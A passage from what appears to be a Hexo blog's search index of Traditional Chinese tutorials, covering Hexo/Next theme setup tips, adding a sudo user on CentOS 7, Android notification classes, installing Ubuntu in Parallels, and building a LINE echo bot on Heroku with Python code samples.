data-url="aHR0cDovL3d3dy5oZWxsb3NoYXduLmNuLzIwMTYvSGV4by1OZXh0JUU0JUI4JUJCJUU5JUEyJTk4JUU1JThEJTlBJUU1JUFFJUEyJUU2JThGJTkwJUU0JUJBJUE0JUU3JTk5JUJFJUU1JUJBJUE2JUU4JUIwJUI3JUU2JUFEJThDJUU2JTk0JUI2JUU1JUJEJTk1Lmh0bWwjJUU5JUFBJThDJUU4JUFGJTgxJUU3JUJEJTkxJUU3JUFCJTk5">Hexo+Next主题博客提交百度谷歌收录<i class="fa fa-external-link-alt"></i></span>。</p><pre><code>GitHub 會擋百度爬蟲。如果你建在 GitHub 上，百度會搜尋不到
</code></pre><p>要避免讓 GitHub 網站被百度擋，有一個解法，可以參考看看<br><span class="exturl" data-url="aHR0cDovL3h5c3BhY2Uud2luLzIwMTcvMTAvMTcvJUU0JUJEJUJGJUU3JTk0JUE4Y29kaW5nLW1lJUU1JThBJUEwJUU5JTgwJTlGSGV4byVFNSU4RCU5QSVFNSVBRSVBMiVFOCVBRSVCRiVFOSU5NyVBRS8=">使用coding.me加速Hexo博客访问<i class="fa fa-external-link-alt"></i></span></p><h2 id="SEO-優化">SEO 優化</h2><p>可以參考這篇，<span class="exturl" data-url="aHR0cDovL2Jsb2cubW9iaW5nLm5ldC9jb250ZW50L2hleG8vaGV4by1uZXh0LXNlby5odG1s">基于Hexo中Next主题的SEO优化指南<i class="fa fa-external-link-alt"></i></span>。</p><h2 id="強化-Markdown-renderer">強化 Markdown renderer</h2><p>執行以下指令，將原生 Markdown 改為 Markdown-it</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm un hexo-renderer-marked --save    <span class="comment"># 刪除原生 Markdown</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm i hexo-renderer-markdown-it --save    <span class="comment"># 安裝 Markdown-it</span></span></span><br></pre></td></tr></table></figure><h2 id="新增標籤頁">新增標籤頁</h2><p>可以參考 Next 官網的這篇教學 <span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20vdGhlbWUtc2V0dGluZ3MuaHRtbCN0YWdzLXBhZ2U=">添加「标签」页面<i class="fa fa-external-link-alt"></i></span>。</p><h2 id="新增分類頁">新增分類頁</h2><p>可以參考 Next 官網的這篇教學 <span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20vdGhlbWUtc2V0dGluZ3MuaHRtbCNjYXRlZ29yaWVzLXBhZ2U=">添加「分类」页面<i class="fa fa-external-link-alt"></i></span>。</p><h2 id="新增關於頁">新增關於頁</h2><p>可以參考 Next 官網的這篇教學 <span class="exturl" data-url="aHR0cDovL3d3dy41aXNqeXguY29tL2NvZGluZy8yMDE3MDQvaGV4b25leHRhYm91dC5odG1s">Hexo about页面怎么写 Next关于页面怎么设置<i class="fa fa-external-link-alt"></i></span>。</p><h2 id="性能優化">性能優化</h2><p>可以參考這兩篇，分別用不同的方法將靜態資源進行壓縮</p><ol><li><span class="exturl" data-url="aHR0cDovL3dhYmVyeWFuZy5jb20vMjAxNy8wMy8xMi9IZXhvJUU1JThEJTlBJUU1JUFFJUEyLU5leHQlRTYlODAlQTclRTglODMlQkQlRTQlQkMlOTglRTUlOEMlOTYlRTQlQjklOEIlRTglQjclQUYv">Hexo博客-Next性能优化之路<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2J1bGVzaGl0Lnh5ei8yMDE3LzAyLzE3L2hleG8lRTUlOEQlOUElRTUlQUUlQTIlRTUlOEElQTAlRTklODAlOUYlRTQlQjklOEIlRTklQTElQjUlRTklOUQlQTIlRTUlOEUlOEIlRTclQkMlQTkv">hexo博客加速之页面压缩<i class="fa fa-external-link-alt"></i></span></li></ol><h2 id="文章編輯後台">文章編輯後台</h2><p>如果覺得編輯完無法立即看到結果，或是結果和本地編輯器有差，可以試著使用看看 hexo-admin，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmtpbnB6ei5jb20vMjAxNi8xMi8zMS9oZXhvLWFkbWluLWJhY2tlbmQtbWFuYWdlbWVudC8=">hexo-admin 博客后端管理工具<i class="fa fa-external-link-alt"></i></span></p><p>使用文章編輯後台一個禮拜後的結論：<strong>難用，不建議使用！</strong><br>建議可以在自己熟悉的 markdown 編輯器編輯就好。</p><h2 id="參考資料">參考資料</h2><p><span class="exturl" data-url="aHR0cHM6Ly9za3lsYWtlLnR3LzIwMTcvMDkvMjkvaGV4by1idWlsZHVwLyNyYW5nLW5leC10LXpodS10aS1kZS1saXN0LWJ1LXpoaS15b3UteXVhbi14aW5n">Hexo部落格建立筆記 | SkyLake’s Blog<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL3poLXR3L2luZGV4Lmh0bWw=">Hexo 官方網站<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20v">Next 官方網站<i class="fa fa-external-link-alt"></i></span></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Next</tag>
        <tag>教學</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在 Centos 7 創建一個 Sudo user</title>
    <url>/how-to-create-a-sudo-user-on-centos-quickstart/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><ol><li>以 root 身份登錄到你的伺服器。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@server_ip_address</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="2"><li><p>使用 adduser 指令將新用戶添加到你的系統</p><p>將 username 替換為你要創建的用戶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adduser username</span><br></pre></td></tr></table></figure><ul><li>使用 passwd 指令更新 user 密碼</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure><ul><li>設置 user 的密碼的顯示訊息</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set password prompts:</span><br><span class="line">Changing password for user username.</span><br><span class="line">New password:</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br></pre></td></tr></table></figure></li><li><p>使用 usermod 指令將用戶添加到 wheel 中。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usermod -aG wheel username</span><br></pre></td></tr></table></figure><p>默認情況下，在 CentOS 上，wheel 的成員具有 sudo 權限。</p></li><li><p>在 user 上測試 sudo 訪問權限</p><ul><li>使用該 su 命令切換到新的 user 。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su - username</span><br></pre></td></tr></table></figure><ul><li>作為 user ，請通過將“sudo”添加到要以超級用戶權限運行的命令來驗證是否可以使用 sudo。</li></ul><p>例如，您可以列出根目錄的內容，/ 通常只能由 root 用戶訪問。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ls -la /</span><br></pre></td></tr></table></figure><ul><li>第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Output:</span><br><span class="line">[sudo] password for username:</span><br></pre></td></tr></table></figure><p>如果您前面操作正確，則使用 sudo 來執行的指令會以 root 權限執行。</p></li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>教學</tag>
        <tag>CentOS</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>NotificationCompat 與 Notification 差別</title>
    <url>/notificationcompat-vs-notification/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>Notification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。</p><a id="more"></a><pre><code>Android 3.0 以上選擇 Notification
Android 3.0 以下選擇 NotificationCompat
</code></pre><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Notification</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Parallels Desktop Lite 安裝 Ubuntu 16.04（macOS）</title>
    <url>/%E4%BD%BF%E7%94%A8-Parallels-Desktop-Lite-%E5%AE%89%E8%A3%9D-Ubuntu-16-04%EF%BC%88macOS%EF%BC%89/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><h2 id="安裝-Parallels-Desktop-Lite">安裝 Parallels Desktop Lite</h2><p>到 <span class="exturl" data-url="aHR0cHM6Ly9pdHVuZXMuYXBwbGUuY29tL3R3L2FwcC9wYXJhbGxlbHMtZGVza3RvcC1saXRlL2lkMTA4NTExNDcwOQ==">Mac App Store<i class="fa fa-external-link-alt"></i></span> 上面可以找到</p><a id="more"></a><h2 id="安裝-Ubuntu-16-04">安裝 Ubuntu 16.04</h2><ol><li><p>開啟 Parallels Desktop Lite<br><img data-src="https://i.imgur.com/FZgYScy.jpg" alt=""></p></li><li><p>安裝 Ubuntu<br><img data-src="https://i.imgur.com/NP5rFfy.png" alt=""></p></li><li><p>選取你下載的 Ubuntu 映像檔，並點擊<strong>繼續</strong><br><img data-src="https://i.imgur.com/A6Gl0Si.png" alt=""></p></li><li><p>取消勾選『快速安裝』，並點擊<strong>繼續</strong><br><img data-src="https://i.imgur.com/OvO4OMw.png" alt=""></p></li><li><p>勾選安裝前設定，可以社設定虛擬機配置<br><img data-src="https://i.imgur.com/DUoG0ug.png" alt=""></p></li><li><p>點擊配置已設定虛擬機，然後點擊<strong>繼續</strong>來開始安裝<br><img data-src="https://i.imgur.com/ET2tcHM.png" alt=""></p></li><li><p>選擇語言<br><img data-src="https://i.imgur.com/oQNjwG8.png" alt=""></p></li><li><p>選擇「安裝 Ubuntu」（如果想先試用，但不安裝，可以點第一項）<br><img data-src="https://i.imgur.com/0Fs3tId.png" alt=""></p></li><li><p>選擇安裝過程的語言<br><img data-src="https://i.imgur.com/on5qjbI.jpg" alt=""></p></li><li><p>建議全部勾選，也可以選擇自己想要的勾選<br><img data-src="https://i.imgur.com/xMeVUEq.jpg" alt=""></p></li><li><p>如果是在虛擬機中安裝，不需分隔磁碟，直接選第一個，然後按「立即安裝」<br><img data-src="https://i.imgur.com/18mN5pS.jpg" alt=""></p></li><li><p>點擊「繼續」開始安裝<br><img data-src="https://i.imgur.com/2fEiSDD.jpg" alt=""></p></li><li><p>選擇時區<br><img data-src="https://i.imgur.com/vMKPjPe.jpg" alt=""></p></li><li><p>選擇鍵盤排列方試（台灣鍵盤為美式鍵盤）<br><img data-src="https://i.imgur.com/S8Ey4nw.jpg" alt=""></p></li><li><p>輸入使用者帳戶資訊<br><img data-src="https://i.imgur.com/HyVXVes.jpg" alt=""></p></li><li><p>等待安裝並重新開機</p></li></ol><blockquote><p>註：如果重新開機失敗，可以點選下圖的重新啟動<br><img data-src="https://i.imgur.com/UD95Mls.jpg" alt=""></p></blockquote><h2 id="Parellels-解析度調整">Parellels 解析度調整</h2><ol><li><p>重新開機後，點擊 Parallels 上方的操作選單，並點擊安裝 Parallels Tools，依照指示完成安裝。<br><img data-src="https://i.imgur.com/GSC8SsF.jpg" alt=""></p></li><li><p>確認螢幕設定為「縮放」<br><img data-src="https://i.imgur.com/7YMXx9t.jpg" alt=""></p></li><li><p>點擊「系統設定值」的按鈕<br><img data-src="https://i.imgur.com/Cd293Gd.jpg" alt=""></p></li><li><p>點擊「顯示器」<br><img data-src="https://i.imgur.com/vuFY6F5.jpg" alt=""></p></li><li><p>在這裡可以調整螢幕的解析度（Macbook 建議調成 1440x900）<br><img data-src="https://i.imgur.com/S9YBeTE.jpg" alt=""></p></li></ol><!-- rebuild by neat -->]]></content>
  </entry>
  <entry>
    <title>LineBot+Python，輕鬆建立聊天機器人</title>
    <url>/line-bot-tutorial/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><blockquote><p>本教學由 <strong>北科程式設計研究社</strong> 所屬<br>喜歡這篇教學，可以到我的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lhb2FuZHkxMDcvbGluZS1ib3QtdHV0b3JpYWw=">Github<i class="fa fa-external-link-alt"></i></span> 上面給我一顆 Star<br>[name=姚韋辰]</p></blockquote><p>本教程介紹如何使用 Python LINE Bot SDK 在 Heroku 上架設一個簡單的回話機器人。</p><a id="more"></a><p>如果您想以另一種語言架設範例 bot，請參閱以下 LINE Bot SDK repositories。</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLXBocA==">PHP<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLWdv">Go<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLXBlcmw=">Perl<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLXJ1Ynk=">Ruby<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLXB5dGhvbg==">Python<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLW5vZGVqcw==">Node.js<i class="fa fa-external-link-alt"></i></span></li></ul><h2 id="在你開始之前">在你開始之前</h2><p>確保您具有以下內容：</p><ul><li>擁有 Line 帳號</li><li>擁有 <span class="exturl" data-url="aHR0cHM6Ly93d3cuaGVyb2t1LmNvbQ==">Heroku<i class="fa fa-external-link-alt"></i></span> 帳戶（您可以免費創建一個）</li></ul><h2 id="建立-Heroku-專案">建立 Heroku 專案</h2><ol><li>登入 Heroku 後，<br>在 <span class="exturl" data-url="aHR0cHM6Ly9kYXNoYm9hcmQuaGVyb2t1LmNvbS9hcHBz">Heroku<i class="fa fa-external-link-alt"></i></span> 頁面中，點選 New -&gt; Create New App<br><img data-src="https://i.imgur.com/Y3njp7I.png" alt=""></li><li>輸入自己喜歡的 App name ，然後點擊 Create app<br><img data-src="https://i.imgur.com/WJ85jXR.png" alt=""></li></ol><h2 id="創建-Line-Bot-頻道">創建 Line Bot 頻道</h2><ol><li>進入 <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmxpbmUubWUvY29uc29sZS8=">Line 控制台<i class="fa fa-external-link-alt"></i></span><br><img data-src="https://i.imgur.com/vseYQt1.png" alt=""></li><li>創建提供者<br><img data-src="https://i.imgur.com/0tnYFBd.png" alt=""></li><li>填入提供者名稱<br><img data-src="https://i.imgur.com/2ne3H1F.png" alt=""></li><li>點擊 Create<br><img data-src="https://i.imgur.com/bdESW8G.png" alt=""></li><li>點擊 Create Channel<br><img data-src="https://i.imgur.com/F1nAWhK.png" alt=""></li><li>填入 Bot 資訊<br><img data-src="https://i.imgur.com/3wYFSvl.png" alt=""></li><li>同意 Line 條款，並按 Create<br><img data-src="https://i.imgur.com/WNzl4sL.png" alt=""></li><li>選擇剛剛創建的 Bot<br><img data-src="https://i.imgur.com/6ocsOBW.png" alt=""></li></ol><h2 id="設定範例機器人">設定範例機器人</h2><p>按照以下步驟架設一個回話機器人。</p><ol><li><p>下載 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lhb2FuZHkxMDcvbGluZS1ib3QtdHV0b3JpYWwvYXJjaGl2ZS9tYXN0ZXIuemlw">範例程式碼<i class="fa fa-external-link-alt"></i></span></p></li><li><p>進入 <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmxpbmUubWUvY29uc29sZS8=">Line 控制台<i class="fa fa-external-link-alt"></i></span>，選擇你剛剛創建的機器人<br><img data-src="https://i.imgur.com/6ocsOBW.png" alt=""></p></li><li><p>開啟 webhook<br><img data-src="https://i.imgur.com/nxvFPB1.png" alt=""><br><img data-src="https://i.imgur.com/PzEKzdq.png" alt=""></p></li><li><p>關閉預設罐頭回覆訊息<br><img data-src="https://i.imgur.com/nXPRhT4.png" alt=""></p></li><li><p>產生 <strong>Channel access token</strong><br><img data-src="https://i.imgur.com/QyxnpZB.png" alt=""><br><img data-src="https://i.imgur.com/quYbPx9.png" alt=""></p></li><li><p>取得 <strong>Channel access token</strong><br><img data-src="https://i.imgur.com/C7OTect.png" alt=""></p></li><li><p>取得 <strong>Channel secret</strong><br><img data-src="https://i.imgur.com/IwmvyzL.png" alt=""></p></li><li><p>使用編輯器開啟範例程式碼資料夾內的 <span class="exturl" data-url="aHR0cDovL2FwcC5weQ==">app.py<i class="fa fa-external-link-alt"></i></span>，將剛剛取得的 <strong>channel secret</strong> 和 <strong>channel access token</strong> 填入<br><img data-src="https://i.imgur.com/Uz16joi.png" alt=""></p></li></ol><h2 id="將程式推到-Heroku-上">將程式推到 Heroku 上</h2><ol><li><p>下載並安裝 <span class="exturl" data-url="aHR0cHM6Ly9kZXZjZW50ZXIuaGVyb2t1LmNvbS9hcnRpY2xlcy9oZXJva3UtY2xp">Heroku CLI<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS8=">Git<i class="fa fa-external-link-alt"></i></span></p></li><li><p>開啟剛剛下載的範例程式碼資料夾，在路徑上輸入 cmd</p></li><li><p>使用終端或命令行應用程序登錄到 Heroku</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">heroku login</span><br></pre></td></tr></table></figure></li><li><p>初始化 git</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"你的名字"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email 你的信箱</span></span><br></pre></td></tr></table></figure><p>注意：<strong>你的名字</strong> 和 <strong>你的信箱</strong> 要換成各自的 <strong>名字</strong> 和 <strong>信箱</strong></p></li><li><p>初始化 git</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>注意：僅第一次使用時要輸入</p></li><li><p>用 git 將資料夾與 heroku 連接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">heroku git:remote -a &#123;HEROKU_APP_NAME&#125;</span><br></pre></td></tr></table></figure><p>注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱</p></li><li><p>輸入以下指令，將程式碼推上 Heroku，<strong>如果有跳出錯誤請重新輸入</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m "Add code"</span><br><span class="line">git push -f heroku master</span><br></pre></td></tr></table></figure><p><strong>每當需要更新 Bot 時，請重新輸入上述指令</strong></p></li></ol><h2 id="將-Heroku-與-Line-綁定">將 Heroku 與 Line 綁定</h2><ol><li><p>進入 <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmxpbmUubWUvY29uc29sZS8=">Line 控制台<i class="fa fa-external-link-alt"></i></span>，選擇你剛剛創建的 Bot<br><img data-src="https://i.imgur.com/6ocsOBW.png" alt=""></p></li><li><p>在 webhook URL 中輸入 Heroku 網址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;HEROKU_APP_NAME&#125;.herokuapp.com/callback</span><br></pre></td></tr></table></figure><p><img data-src="https://i.imgur.com/EkDhAgb.png" alt=""><br>注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱</p></li></ol><h2 id="測試範例成果">測試範例成果</h2><ol><li>進入 <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmxpbmUubWUvY29uc29sZS8=">Line 控制台<i class="fa fa-external-link-alt"></i></span>，選擇你剛剛創建的 Bot<br><img data-src="https://i.imgur.com/6ocsOBW.png" alt=""></li><li>通過在控制台的 “Channel settings” 頁面上掃描 QR Code，將您的 Bot 添加到 LINE 的朋友中</li><li>在 Line 上向您的 Bot 發送文字訊息，並確認它會學你說話</li></ol><h2 id="錯誤尋找">錯誤尋找</h2><blockquote><p>當程式遇到問題時，可查看日誌以找出錯誤</p></blockquote><p>要查看您的 Bot 在 Heroku 的日誌，請按照以下步驟。</p><ol><li><p>如果沒登入，請先透過 Heroku CLI 登入</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">heroku login</span><br></pre></td></tr></table></figure></li><li><p>顯示 app 日誌</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">heroku logs --tail --app &#123;HEROKU_APP_NAME&#125;</span><br></pre></td></tr></table></figure><p>注意：{HEROKU_APP_NAME} 是上述步驟2中的應用名稱。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--tail                     # 持續打印日誌</span><br><span class="line">--app &#123;HEROKU_APP_NAME&#125;    # 指定 App</span><br></pre></td></tr></table></figure></li></ol><h2 id="程式檔案解說">程式檔案解說</h2><blockquote><p>資料夾裡需含有兩份文件來讓你的程式能在 heroku 上運行</p></blockquote><ul><li>Procfile：heroku 執行命令，web: {語言} {檔案}，這邊語言為 python，要自動執行的檔案為 <span class="exturl" data-url="aHR0cDovL2FwcC5weQ==">app.py<i class="fa fa-external-link-alt"></i></span>，因此我們改成 <strong>web: python <span class="exturl" data-url="aHR0cDovL2FwcC5weQ==">app.py<i class="fa fa-external-link-alt"></i></span></strong>。</li><li>requirements.txt：列出所有用到的套件，heroku 會依據這份文件來安裝需要套件</li></ul><h3 id="app-py-主程式"><span class="exturl" data-url="aHR0cDovL2FwcC5weQ==">app.py<i class="fa fa-external-link-alt"></i></span> (主程式)</h3><p>可透過修改程式裡的 handle_message() 方法內的程式碼來控制機器人的訊息回覆</p><p><img data-src="https://i.imgur.com/DNeNbpV.png" alt=""></p><p>新版範例程式碼內附註解<br>如想更多了解此程式，可以去研究 Git、Python3、<span class="exturl" data-url="aHR0cDovL2RvY3Muamlua2FuLm9yZy9kb2NzL2ZsYXNrLw==">Flask 套件<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLXB5dGhvbg==">Line bot sdk<i class="fa fa-external-link-alt"></i></span></p><h2 id="進階操作">進階操作</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpbmUvbGluZS1ib3Qtc2RrLXB5dGhvbiNhcGk=">官方文件<i class="fa fa-external-link-alt"></i></span></p><h3 id="回覆訊息">回覆訊息</h3><p>只有當有訊息傳來，才能回覆訊息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line_bot_api.reply_message(reply_token, 訊息物件)</span><br></pre></td></tr></table></figure><h3 id="主動傳送訊息">主動傳送訊息</h3><p>Bot 需要有開啟 push 功能才可以做，否則程式會出錯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line_bot_api.push_message(push_token, 訊息物件)</span><br></pre></td></tr></table></figure><h2 id="訊息物件分類">訊息物件分類</h2><p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmxpbmUubWUvZW4vZG9jcy9tZXNzYWdpbmctYXBpL21lc3NhZ2UtdHlwZXMv">官方文件<i class="fa fa-external-link-alt"></i></span></p><p>修改範例程式碼中， handle_message() 方法內的程式碼，可實現多種功能</p><h3 id="TextSendMessage-（文字訊息）">TextSendMessage （文字訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS9MaWVDRkFiLnBuZw==">https://i.imgur.com/LieCFAb.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = TextSendMessage(text=<span class="string">'Hello, world'</span>)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="ImageSendMessage（圖片訊息）">ImageSendMessage（圖片訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS9SYUg3Z3FvLnBuZw==">https://i.imgur.com/RaH7gqo.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = ImageSendMessage(</span><br><span class="line">    original_content_url=<span class="string">'https://example.com/original.jpg'</span>,</span><br><span class="line">    preview_image_url=<span class="string">'https://example.com/preview.jpg'</span></span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="VideoSendMessage（影片訊息）">VideoSendMessage（影片訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS9vNmN2ZjNvLnBuZw==">https://i.imgur.com/o6cvf3o.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = VideoSendMessage(</span><br><span class="line">    original_content_url=<span class="string">'https://example.com/original.mp4'</span>,</span><br><span class="line">    preview_image_url=<span class="string">'https://example.com/preview.jpg'</span></span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="AudioSendMessage（音訊訊息）">AudioSendMessage（音訊訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS93NXN6WmFnLnBuZw==">https://i.imgur.com/w5szZag.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = AudioSendMessage(</span><br><span class="line">    original_content_url=<span class="string">'https://example.com/original.m4a'</span>,</span><br><span class="line">    duration=<span class="number">240000</span></span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="LocationSendMessage（位置訊息）">LocationSendMessage（位置訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS90WEU3QXVzLnBuZw==">https://i.imgur.com/tXE7Aus.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = LocationSendMessage(</span><br><span class="line">    title=<span class="string">'my location'</span>,</span><br><span class="line">    address=<span class="string">'Tokyo'</span>,</span><br><span class="line">    latitude=<span class="number">35.65910807942215</span>,</span><br><span class="line">    longitude=<span class="number">139.70372892916203</span></span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="StickerSendMessage（貼圖訊息）">StickerSendMessage（貼圖訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS83eDBtZ0sxLnBuZw==">https://i.imgur.com/7x0mgK1.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = StickerSendMessage(</span><br><span class="line">    package_id=<span class="string">'1'</span>,</span><br><span class="line">    sticker_id=<span class="string">'1'</span></span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="ImagemapSendMessage-（組圖訊息）">ImagemapSendMessage （組圖訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS9Nb1NmMkQ2LnBuZw==">https://i.imgur.com/MoSf2D6.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = ImagemapSendMessage(</span><br><span class="line">    base_url=<span class="string">'https://example.com/base'</span>,</span><br><span class="line">    alt_text=<span class="string">'this is an imagemap'</span>,</span><br><span class="line">    base_size=BaseSize(height=<span class="number">1040</span>, width=<span class="number">1040</span>),</span><br><span class="line">    actions=[</span><br><span class="line">        URIImagemapAction(</span><br><span class="line">            link_uri=<span class="string">'https://example.com/'</span>,</span><br><span class="line">            area=ImagemapArea(</span><br><span class="line">                x=<span class="number">0</span>, y=<span class="number">0</span>, width=<span class="number">520</span>, height=<span class="number">1040</span></span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        MessageImagemapAction(</span><br><span class="line">            text=<span class="string">'hello'</span>,</span><br><span class="line">            area=ImagemapArea(</span><br><span class="line">                x=<span class="number">520</span>, y=<span class="number">0</span>, width=<span class="number">520</span>, height=<span class="number">1040</span></span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="TemplateSendMessage-ButtonsTemplate-（按鈕介面訊息）">TemplateSendMessage - ButtonsTemplate （按鈕介面訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS80MWxYV2pQLnBuZw==">https://i.imgur.com/41lXWjP.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = TemplateSendMessage(</span><br><span class="line">    alt_text=<span class="string">'Buttons template'</span>,</span><br><span class="line">    template=ButtonsTemplate(</span><br><span class="line">        thumbnail_image_url=<span class="string">'https://example.com/image.jpg'</span>,</span><br><span class="line">        title=<span class="string">'Menu'</span>,</span><br><span class="line">        text=<span class="string">'Please select'</span>,</span><br><span class="line">        actions=[</span><br><span class="line">            PostbackTemplateAction(</span><br><span class="line">                